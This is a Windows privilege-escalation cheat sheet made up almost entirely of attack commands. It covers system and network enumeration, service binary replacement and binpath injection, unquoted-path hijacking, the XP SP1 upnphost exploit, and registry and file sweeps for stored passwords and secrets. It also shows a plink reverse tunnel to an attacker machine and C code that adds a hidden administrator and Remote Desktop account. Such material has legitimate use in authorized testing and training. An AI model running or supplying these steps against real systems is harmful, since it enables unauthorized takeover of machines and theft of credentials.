# Reuseful escalation patterns

## Host Information

Get OS version, patches, etc.:

    systeminfo
    type C:\Windpws\system32\eula.txt
    type C:\BOOT.INI

Get current user:

    whoami
    whoami /priv
    echo %username%

Get environment variables:

    set

List users:

    net accounts
    net group
    net users

List user details:

    net users <user>

Network information:

    ipconfig /all

Routing information:

    netstat -r
    route print
    arp -a

Firewall information:

    netsh firewall show state
    netsh firewall show config

List open connections:

    netstat -aton

List scheduled tasks:

    schtasks /query /fo LIST /v

## Firewall and AV information

Check Windows defender:

    sc query windefend

View all services running on the machine:

    sc queryex type= service
    sc = service control

Firewall settings:

    netsh advfirewall firewall dump
    netsh firewall show state

Show firewall config:

    netsh firewall show config

## Services

List Windows services:

    net start
    tasklist /SV
    wmic service list brief
    sc query state= all

## Weak services

Find misconfigured permissions by finding executables and running `icalcs` or `cacls` commands to determine user 
permissions. If lucky they may have full (F) or modified (M) permissions for the current user.

Also look for unquoted path folders such as `C:\Program Files` that run as `SYSTEM/Administrator`.

On newer machines:

    icacls "C:\<path-to-service>.exe"

Older machines:

    cacls "C:\<path-to-service>.exe"

If `wmic` is available, pull a list with:

    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\" |findstr /i /v """

Change a weak service by replacing the executable with a malicious one:

    move <evil-file>.exe "C:\Program Files\<service>\<file>.exe"

Then reboot the server or wait for system to restart it.

Or if possible, inject the service path:

    sc config <service> binpath= "<exploit-code>"

Then restart the service:

    sc stop <service>
    sc start <service>

## Windows XP SP1

Windows XP SP1 has a known vulnerability in upnphost.

First start by making sure its dependency and service is running:

    sc config SSDPSRV start= auto
    net start SSDPSRV

Then change the executable path:

    sc config upnphost binpath= "<exploit-code>"
    sc config upnphost obj= ".\LocalSystem" password= ""
    sc qc upnphost

Then start the service:

    net start upnphost

If both `wmic` and `sc` are not available, use [accesschk](https://download.sysinternals.com/files/AccessChk.zip)

    accesschk.exe -uwcqv "Authenticated Users" * /accepteula

## Space in service path

If the above service search came up with a path such as:

    C:\Program Files\<service>\<file>.exe

This could allow replacement by an `evil.exe` file in:

    C:\Program.exe

## Start/Stop with denied permissions

If a service gives a permission denied to start or stop, 
[this may or may not be exploitable](http://woshub.com/set-permissions-on-windows-service/).

## Search files and registry

List current directory with metadata, system and data stream files:

    dir /s /q /R

Attempt to find password strings in common files:

    findstr /spin password *.txt
    findstr /spin password *.xml
    findstr /spin password *.config
    findstr /si password *.ini
    findstr /spin credentials *.txt
    findstr /spin credentials *.xml
    findstr /spin credentials *.config
    findstr /si credentials *.ini
    findstr /spin secret *.txt
    findstr /spin secret *.xml
    findstr /spin secret *.config
    findstr /si secret *.ini

Attempt to find password strings in all files:

    findstr /spin "password" *.*
    findstr /spin "credentials" *.*
    findstr /spin "secret" *.*

Find all common configuration or sensitive files:

    dir/q \*.txt /s
    dir/q \*.rar /s
    dir/q \*.zip /s
    dir/q \*.xls /s
    dir/q \*.xlsx /s
    dir/q \*.ini /s
    dir/q \*.cap /s
    dir/q \*.pcap /s
    dir/q \*.exe /s
    dir/q \*.pdf /s

Attempt to find password strings in registry settings:

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

## Port Forwarding

Using plink.exe. Recommend using secondary user from attacking machine:

    plink.exe -l <user> -pw <password> <attacking-ipaddress> -R <lport>:127.0.0.1:<rport>

## Network drives

### Find users mapped drives

Show current mapped drives:

    net share

Search registry for user SID:

    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\" /s

Then finding the SID, get the network paths and usernames used to connect, if any:

    reg query "HKEY_USERS\<SID>\Network" /s

### Map a drive

Create a network drive:

    net use Z: \\<path>\

Map to Domain Controller sysvol:

    net use Z: \\<dc>\SYSVOL

Search for group policy xml:

    z:
    dir /s /q groups.xml

## Search for kernel vulnerabilities.

Copy systeminfo to a text file on attacking machine.

Download Windows Exploit Suggester:

    wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

Download bulletin database:

    wget http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx

Install requirements:

    apt -y install python-xlrd

Run:

    python windows-exploit-suggester.py --systeminfo systeminfo.txt --database BulletinSearch.xlsx

## Common Simple Overwrite Code

Create an admin user and add to administrator and remote desktop groups:

    #include <stdlib.h>
    int main ()
    {
        system("net user <user> <password> /add");
        system("net localgroup administrators <user> /add");
        system("net localgroup administrators "Remote Desktop Users" <user> /add");
        return 0;
    }

Compile:

    i686-w64-mingw32-gcc <file>.c -lws2_32 -o <output>.exe